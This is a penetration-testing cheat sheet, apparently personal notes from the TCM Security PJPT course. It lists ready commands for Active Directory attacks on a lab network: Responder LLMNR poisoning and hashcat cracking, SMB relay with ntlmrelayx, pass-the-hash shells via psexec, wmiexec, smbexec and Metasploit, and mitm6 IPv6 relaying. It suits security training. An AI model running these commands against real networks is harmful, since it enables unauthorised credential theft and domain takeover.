# PJPT-Notes
Cheatsheet from the PJPT course of TCM security.

# Enumeration
```bash
sudo arp-scan -l
```
```bash
netdiscover -r 192.168.5.0/24
```

```bash
nmap -T4 -p- -A 192.168.5.0/24
nmap -T4 -p- -A 192.168.5.1

nmap -T4 -p- -sS -sC 192.168.5.0/24
```

# Initial attacks for Active Directory
## LLMNR Poisoning
1. Start Responder, to capture NTLMv2 hashes
```bash
sudo responder -I tun0 -dP
```
2. If NTLMv2 hash was captured, copy it, save it to a txt file and crack it with hashcat
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## SMB Relay attack
<p>This attacks works, when SMB signing is disabled on the machines.</p>
1. Enumerate, if SMB signing is disabled
```bash
nmap -p445 192.168.5.0/24 --script=smb2-security-mode
```
2. Make changes in the Responder configuration

```bash
sudo nano /etc/responder/Responder.conf

SMB = Off
HTTP = Off
```

3. Start Responder
```bash
sudo responder -I tun0 -dP
```
4. Setup the relay
```bash
# to dump password hashes
sudo ntlmrelayx.py -tf targets.txt -smb2support

# to create a interactive shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# to run commands to proof
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

# Gaining Shell Access
## Psexec
<p>Create a shell with psexec</p>

```bash
# for domain users
psexec.py test.local/fcastle:'Password1'@192.168.5.1

# for local users
psexec.py fcastle:'Password1'@192.168.5.1

# with local user and password hash
psexec.py Administrator@192.168.5.1 --hashes [LM-hash]:[NTLM-hash]
```

## Wmiexec
<p>Create a shell with wmiexec</p>

```bash
# with local user and password hash
wmiexec.py Administrator@192.168.5.1 --hashes [LM-hash]:[NTLM-hash]
```

## Smbexec
<p>Create a shell with smbexec</p>

```bash
# with local user and password hash
smbexec.py test.local/fcastle:'Password1'@192.168.5.1
```

## Metasploit
<p>Create a shell with metasploit</p>

```bash
use exploit/windows/smb/psexec
set SMBDomain test.local
set SMBUser fcastle
set SMBPass Password1
```

# IPv6 attacks
<p>If IPv6 is activated in the network, but no DNS server in use, we can imitate one.</p>

1. Open mitm6 for target domain
```bash
sudo mitm6 -d test.local
```

2. Start Ntlmrelayx.py
```bash
Ntlmrelayx.py -6 -t ldaps://192.168.5.1 -wh fakewpad.test.local -l lootme
```

3. You results will save into: '**/home/kali/lootme/domain_computers.html**'
